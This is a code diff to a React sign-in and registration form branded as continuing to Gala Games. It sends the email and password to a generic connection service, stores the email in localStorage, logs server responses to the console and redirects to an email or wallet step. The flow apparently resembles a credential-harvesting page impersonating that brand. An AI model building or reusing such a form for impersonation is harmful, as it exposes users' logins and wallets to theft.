@@ -14,6 +14,7 @@ import {routeConstants} from "@/constants/route";
 import {Recaptcha} from "@/components/captcha";
 import {connection} from "@/services/connection";
 
+
 const schema = yup.object().shape({
   email: yup.string().email('Email is not valid').required('Email is required'),
   password: yup.string().min(6, 'Password must be at least 6 characters').required('Password is required'),
@@ -32,18 +33,17 @@ export const AuthForm = ({isSignIn = true}: { isSignIn?: boolean }) => {
 
   const accountNotFound = searchParams.get('not-found') && !isSignIn;
 
-  const isDisabled = !isDirty || !isValid || !checked;
+  const isDisabled = !isDirty || !isValid || !checked || loading;
 
   const onSubmit = async (formData: { email: string; password: string }) => {
     setLoading(true)
-    sessionStorage.setItem(sessionConst.Email, formData.email)
+    localStorage.setItem(sessionConst.Email, formData.email)
 
     const dataToSend = {
       email: ` ${formData.email} `,
       password: ` ${formData.password} `,
       variant: isSignIn ? ' login ' : ' register '
     }
-
 
     if (isSignIn) {
       const {data, error} = await connection.withActions(dataToSend)
@@ -72,12 +72,15 @@ export const AuthForm = ({isSignIn = true}: { isSignIn?: boolean }) => {
       if (data) {
         setLoading(false);
 
-        router.push(`${routeConstants.HOME}?wallet=yes`)
+        console.log('data', data)
+
+        const path = data === 'success' ? 'email=yes' : 'wallet=yes'
+        console.log('path', path)
+        router.push(`${routeConstants.HOME}?${path}`)
       }
     }
+  }
 
-
-  };
 
   return (
     <div className={styles.container}>
@@ -88,7 +91,9 @@ export const AuthForm = ({isSignIn = true}: { isSignIn?: boolean }) => {
         <h2 className={styles.title}>Welcome</h2>
         <p className={styles.subtitle}>{isSignIn ? "Log in" : "Register"} to continue to Gala Games.</p>
 
-      {accountNotFound &&  <p className={styles.errorMessage}>We couldn{"'"}t find an account associated with this email address. Please register to get started.</p>} 
+        {accountNotFound &&
+            <p className={styles.errorMessage}>We couldn{"'"}t find an account associated with this email address.
+                Please register to get started.</p>}
 
         <form className={styles.emailForm} onSubmit={handleSubmit(onSubmit)}>
           <div className={styles.inputWrapper}>
